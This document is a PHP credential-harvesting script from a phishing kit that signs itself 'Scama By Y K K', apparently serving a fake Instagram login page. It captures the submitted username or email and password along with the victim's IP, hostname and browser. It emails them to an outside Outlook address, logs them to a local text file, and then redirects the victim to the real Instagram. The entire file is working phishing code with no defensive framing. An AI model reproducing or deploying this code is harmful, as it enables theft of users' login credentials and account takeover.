<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$YKK .= "|----------|Scama By Y K K|--------------|\n";
$YKK .= "-------------------- Login -------------------\n";
$YKK .= "--------------  Infos -------------\n";
$YKK .= "Numéro de téléphone, nom d’utilisateur ou adresse e-mail     : ".$_POST['Email']."\n";
$YKK .= "Mot de passe      : ".$_POST['Passe']."\n";
$YKK .= "|---------------|Info|-------------------|\n";
$YKK .= "IP      : $ip\n";
$YKK .= "HOST    : ".gethostbyaddr($ip)."\n";
$YKK .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$YKK .= "|----------|Scama By Y K K|--------------|\n";
$send = "scama1hf@outlook.fr";
$subject = "~ New Résultat By Y K K ~ | $ip";
{
mail("$send", "$subject", $YKK);     
}

$file = fopen("./YKK.txt", 'a');
fwrite($file, $YKK);

header("Location: https://www.instagram.com/");
?>